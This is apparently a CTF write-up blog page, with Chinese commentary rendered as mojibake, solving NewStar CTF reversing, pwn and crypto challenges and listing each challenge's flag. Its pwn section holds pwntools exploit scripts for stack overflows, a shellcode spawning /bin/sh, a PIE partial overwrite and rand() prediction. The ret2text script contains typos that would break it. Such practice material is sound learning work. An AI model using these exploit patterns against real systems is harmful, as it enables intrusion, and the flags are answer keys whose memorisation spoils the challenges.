<h2 id="AndroXor"><a href="#AndroXor" class="headerlink" title="AndroXor"></a>AndroXor</h2><p>å…³é”®é€»è¾‘åœ¨è¿™é‡Œï¼Œèƒ½çœ‹åˆ°é•¿åº¦ï¼Œè¿˜æœ‰å¼‚æˆ–çš„æ“ä½œï¼Œåªéœ€è¦æ ¹æ®happyx3 è¿˜æœ‰ cArrç½®åå°±èƒ½å¾—åˆ°inputString</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">Xor</span><span class="params">(String str, String str2)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] cArr = &#123;<span class="number">14</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">2</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="number">30</span>, <span class="number">20</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;\f&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="number">11</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="number">25</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>&#125;;</span><br><span class="line">        <span class="type">char</span>[] cArr2 = <span class="keyword">new</span> <span class="title class_">char</span>[str.length()];</span><br><span class="line">        <span class="type">String</span> <span class="variable">str3</span> <span class="operator">=</span> str.length() != <span class="number">25</span> ? <span class="string">&quot;wrong!!!&quot;</span> : <span class="string">&quot;you win!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">charAt</span> <span class="operator">=</span> (<span class="type">char</span>) (str.charAt(i) ^ str2.charAt(i % str2.length()));</span><br><span class="line">            cArr2[i] = charAt;</span><br><span class="line">            <span class="keyword">if</span> (cArr[i] != charAt) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;wrong!!!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str3;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Toast.makeText(mainActivity, mainActivity.Xor(obj, <span class="string">&quot;happyx3&quot;</span>), <span class="number">1</span>).show();</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">str2 = <span class="string">&quot;happyx3&quot;</span></span><br><span class="line">cArr = [<span class="number">14</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">2</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="number">30</span>, <span class="number">20</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;\f&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="number">11</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="number">25</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>]</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(cArr[i] ^ <span class="built_in">ord</span>(str2[i % <span class="built_in">len</span>(str2)])) <span class="keyword">if</span> <span class="built_in">isinstance</span>(cArr[i], <span class="built_in">int</span>) <span class="keyword">else</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(cArr[i]) ^ <span class="built_in">ord</span>(str2[i % <span class="built_in">len</span>(str2)])) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cArr))])</span><br><span class="line"><span class="built_in">print</span>(str1)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3z_And0r1d_X0r_x1x1&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Endian"><a href="#Endian" class="headerlink" title="Endian"></a>Endian</h2><p>è¿™é‡Œv5æ˜¯ä¸ªæŒ‡é’ˆæ¥çš„ï¼Œä¸€å¼€å§‹çœ‹æœ‰äº›æ€ªï¼Œè¿‡ä¸€ä¼šå°±æ‡‚äº†ã€‚éœ€è¦å†å¼‚æˆ–ä¸€æ¬¡ï¼Œç„¶åæŒ‰å­—èŠ‚æ‹†åˆ†æ•°å­—ï¼Œå°ç«¯åºè½¬å¤§ç«¯åºå°±å¥½äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v6);</span><br><span class="line">  v5 = v6;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v5 != (<span class="built_in">array</span>[i] ^ <span class="number">0x12345678</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;wrong!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v5 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you are right&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_and_combine</span>(<span class="params">hex_values</span>):</span><br><span class="line">    </span><br><span class="line">    xor_results = [<span class="built_in">hex</span>(<span class="built_in">int</span>(value, <span class="number">16</span>) ^ <span class="number">0x12345678</span>) <span class="keyword">for</span> value <span class="keyword">in</span> hex_values]</span><br><span class="line"></span><br><span class="line">    reversed_strings = []</span><br><span class="line">    <span class="keyword">for</span> xor_result <span class="keyword">in</span> xor_results:</span><br><span class="line">        xor_result = xor_result[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        result_string = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(xor_result[i:i + <span class="number">2</span>], <span class="number">16</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>, <span class="number">2</span>)])</span><br><span class="line">        reversed_strings.append(result_string[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    combined_string = <span class="string">&quot;&quot;</span>.join(reversed_strings)</span><br><span class="line"></span><br><span class="line">   	<span class="keyword">return</span> combined_string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = [<span class="string">&quot;75553A1E&quot;</span>, <span class="string">&quot;7B583A03&quot;</span>, <span class="string">&quot;4D58220C&quot;</span>, <span class="string">&quot;7B50383D&quot;</span>, <span class="string">&quot;736B3819&quot;</span>]</span><br><span class="line">inputString = process_and_combine(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(inputString)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;llittl_Endian_a&#125;</span><br></pre></td></tr></table></figure>



<h2 id="EzPE"><a href="#EzPE" class="headerlink" title="EzPE"></a>EzPE</h2><p>ä¿®å¤peå¤´çš„è¯ï¼Œæ‰¾ä¸ªexe 010editä»å¼€å§‹åˆ°0x70hé‚£ä¸€è¡Œç²˜è´´ä¸€ä¸‹ï¼Œå°±å¥½äº†</p>
<p>å¼‚æˆ–ç½®åä¸€ä¸‹å°±å¥½äº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">data = [</span><br><span class="line">    <span class="number">0x0A</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, <span class="number">0x1F</span>, <span class="number">0x26</span>, <span class="number">0x6C</span>, <span class="number">0x43</span>, <span class="number">0x2D</span>, <span class="number">0x3C</span>, <span class="number">0x0C</span>, </span><br><span class="line">    <span class="number">0x54</span>, <span class="number">0x4C</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x11</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x3A</span>, <span class="number">0x7C</span>, <span class="number">0x51</span>, </span><br><span class="line">    <span class="number">0x38</span>, <span class="number">0x1A</span>, <span class="number">0x03</span>, <span class="number">0x0D</span>, <span class="number">0x01</span>, <span class="number">0x36</span>, <span class="number">0x1F</span>, <span class="number">0x12</span>, <span class="number">0x26</span>, <span class="number">0x04</span>, </span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x5D</span>, <span class="number">0x3F</span>, <span class="number">0x2D</span>, <span class="number">0x37</span>, <span class="number">0x2A</span>, <span class="number">0x7D</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">input_recovered = [<span class="number">0</span>] * <span class="built_in">len</span>(data)</span><br><span class="line">input_recovered[-<span class="number">1</span>] = data[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data) - <span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    input_recovered[i] = data[i] ^ (i ^ input_recovered[i + <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> input_recovered:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y0u_kn0w_what_1s_PE_File_F0rmat&#125;</span><br></pre></td></tr></table></figure>



<h2 id="lazy-activtiy"><a href="#lazy-activtiy" class="headerlink" title="lazy_activtiy"></a>lazy_activtiy</h2><p>activtiyæ˜¯æä¾›ç”¨æˆ·ç•Œé¢ï¼Œå¯ä»¥ä½¿ç”¨æˆ·äº¤äº’çš„ï¼Œç¨‹åºä¸­æœ‰ä¸ªflag activtiyä½†æ˜¯ä¸»ç•Œé¢æ²¡æœ‰ä»€ä¹ˆåœ°æ–¹èƒ½å¤Ÿè°ƒç”¨è¿™ä¸ªactivityçš„æœäº†ä¸€ä¸‹å¯ä»¥ç”¨</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">am start -n com.droidlearn.activity_travel/com.droidlearn.activity_travel.FlagActivity</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‘½ä»¤adb shellçš„å‘½ä»¤æ¥è°ƒç”¨ä¸€ä¸ªåº”ç”¨çš„activtiy</p>
<p>è¿™è¾¹æ˜¯flag activityçš„å…³é”®é€»è¾‘ï¼Œå¯ä»¥åç¼–è¯‘ç„¶åå°†10000æ”¹æˆ1å°±å¥½äº†ã€‚ä½†æ˜¯æŠ˜è…¾äº†å¥½ä¹…apktoolsåç¼–è¯‘æ‰“åŒ…æœ‰é—®é¢˜ï¼Œè¿˜æœ‰ç­¾åé‚£ï¼Œåé¢æ‰¾äº†ä¸€ä¸ªå®‰å“ä¿®æ”¹å¤§å¸ˆç ´è§£ç‰ˆï¼Œä¸€é”®æ‰“åŒ…ç­¾åå°±æ­£å¸¸äº†</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                textView.setText(Integer.toString(FlagActivity.access$<span class="number">004</span>(FlagActivity.<span class="built_in">this</span>)));</span><br><span class="line">                <span class="keyword">if</span> (FlagActivity.<span class="built_in">this</span>.cnt &gt;= <span class="number">10000</span>) &#123;</span><br><span class="line">                    Toast.makeText(FlagActivity.<span class="built_in">this</span>, editText.getText().toString(), <span class="number">0</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Act1v1ty_!s_so00oo0o_Impor#an#&#125;</span><br></pre></td></tr></table></figure>



<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>æœ‰ä¸ªbackdoorå‡½æ•°ï¼Œæº¢å‡ºåè·³è¿‡å»å°±å¥½äº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port = <span class="number">29750</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process()</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">line = p.recvline(); <span class="built_in">print</span>(line) <span class="comment"># Welcome to NewStar CTF!!</span></span><br><span class="line">line = p.recvline(); <span class="built_in">print</span>(line) <span class="comment"># Show me your magic</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">backdoor_address = <span class="number">0x4011FB</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">32</span> + <span class="number">8</span>)</span><br><span class="line">paylaod += backdoor_adress</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>shellcodeè¾“å…¥åä¼šç›´æ¥jmpåˆ°bufé‚£ï¼Œæ‰€ä»¥åªéœ€è¦æŠŠshellcodeè¾“å…¥å°±å¥½äº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./ezshellcode&#x27;</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port = <span class="number">29750</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process()</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">line = p.recvline(); <span class="built_in">print</span>(line) <span class="comment"># Welcome to NewStar CTF!!</span></span><br><span class="line">line = p.recvline(); <span class="built_in">print</span>(line) <span class="comment"># Show me your magic</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode  =  asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload = shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="newstar-shop"><a href="#newstar-shop" class="headerlink" title="newstar shop"></a>newstar shop</h2><p>é€‰1è¿›å•†åº—ä¹°åˆ°æ²¡é’±ç„¶åé€‰3 -50åï¼Œuintæº¢å‡ºå°±èƒ½ç›´æ¥ä¹°&#x2F;bin shäº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8b42af7c-c695-489a-ad79-1bff9d84f52c&#125;</span><br></pre></td></tr></table></figure>



<h2 id="p1eee"><a href="#p1eee" class="headerlink" title="p1eee"></a>p1eee</h2><p>å’±æ˜¯ç¬¨è›‹ï¼Œä¹ æƒ¯æ€§çœ‹idaä¸­çš„å‡½æ•°è§†å›¾äº†ï¼Œæ²¡æ³¨æ„åˆ°å…³é”®å‡½æ•°ä¸‹é¢æœ‰ä¸ªç”¨_asm{}å†™çš„ç›´æ¥system bin shçš„å—ï¼Œpieçš„è¯ä½ä¸‰ä½16è¿›åˆ¶çš„åœ°å€æ˜¯ä¸å˜çš„ï¼Œæ‰€ä»¥åªéœ€è¦åœ¨returnä½ç½®é‚£å¡«å……ä½ä½åœ°å€ï¼Œæ ¹æ®åŸæœ‰çš„é«˜ä½åœ°å€ï¼Œå°±èƒ½è·³è¿‡å»ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001264 ; __unwind &#123;</span><br><span class="line">.text:0000000000001264                 endbr64</span><br><span class="line">.text:0000000000001268                 push    rbp</span><br><span class="line">.text:0000000000001269                 mov     rbp, rsp</span><br><span class="line">.text:000000000000126C                 lea     rdi, aBinSh     ; &quot;/bin/sh&quot;</span><br><span class="line">.text:0000000000001273                 call    _system</span><br><span class="line">.text:0000000000001278                 nop</span><br><span class="line">.text:0000000000001279                 pop     rbp</span><br><span class="line">.text:000000000000127A                 retn</span><br><span class="line">.text:000000000000127A ; &#125; // starts at 1264</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./p1eee&#x27;</span>)</span><br><span class="line">ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port = <span class="number">26886</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = process()</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">line = p.recvline(); <span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">32</span> + <span class="number">8</span>) + p8(<span class="number">0x6C</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()  </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cc6d8d8e-cae4-4f5d-88b5-8ddd66f66a2c&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h2><p>å¯ä»¥ç”¨ctypes è°ƒç”¨libcä¸­çš„time srand randå‡½æ•°ï¼Œæ ¡å›­ç½‘å¥½å¡ï¼Œå»å¤–è¾¹æ‰æ‰“é€šäº†ï¼Œè¦å¤šè·‘å‡ éï¼Œéšæœºæ•°æ‹¼å‡‘å­—ç¬¦å¯¹äº†æ‰å¯ä»¥</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_29912475/article/details/130319284">https://blog.csdn.net/qq_29912475/article/details/130319284</a> </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./Random&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port = <span class="number">25248</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆå§‹åŒ–å‡½æ•°è¿”å›å€¼</span></span><br><span class="line">libc.time.restype = ctypes.c_long</span><br><span class="line">libc.srand.argtypes = [ctypes.c_uint]</span><br><span class="line"></span><br><span class="line"><span class="comment">#è°ƒç”¨å‡½æ•°</span></span><br><span class="line">time_value = ctypes.c_longlong(<span class="number">0</span>)</span><br><span class="line">seed = libc.time(ctypes.byref(time_value))</span><br><span class="line">libc.srand(seed)</span><br><span class="line">rand_result = libc.rand()</span><br><span class="line"></span><br><span class="line">line = p.recvline(); <span class="built_in">print</span>(line)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(rand_result))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f5be13ec-f7f0-4dea-ab64-31470e102fbf&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h2><p>å¯ä»¥ç”¨è¿™ä¸ªè§£å¯† <a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/brainfuck">https://ctf.bugku.com/tool/brainfuck</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Oiiaioooooiai#b7c0b1866fe58e12&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Caesarâ€™s-Secert"><a href="#Caesarâ€™s-Secert" class="headerlink" title="Caesarâ€™s Secert"></a>Caesarâ€™s Secert</h2><p>æƒ³åˆ°åç§»é‡ï¼Œå‡¯æ’’å¯†ç ï¼Œ<a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/caesar">https://ctf.bugku.com/tool/caesar</a> åç§»5è§£å‡ºflag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ca3s4r&#x27;s_c1pher_i5_v4ry_3azy&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Fence"><a href="#Fence" class="headerlink" title="Fence"></a>Fence</h2><p>æ …æ å¯†ç  <a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a> è§£å¯†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;reordering_the_plaintext#686f8c03&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Vigenere"><a href="#Vigenere" class="headerlink" title="VigenÃ¨re"></a>VigenÃ¨re</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">vigenere_decrypt_single</span>(<span class="params">char_ciphertext, char_plaintext</span>):</span><br><span class="line">    alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">    index_ciphertext = alphabet.index(char_ciphertext)</span><br><span class="line">    index_plaintext = alphabet.index(char_plaintext)</span><br><span class="line">    index_key = (index_ciphertext - index_plaintext) % <span 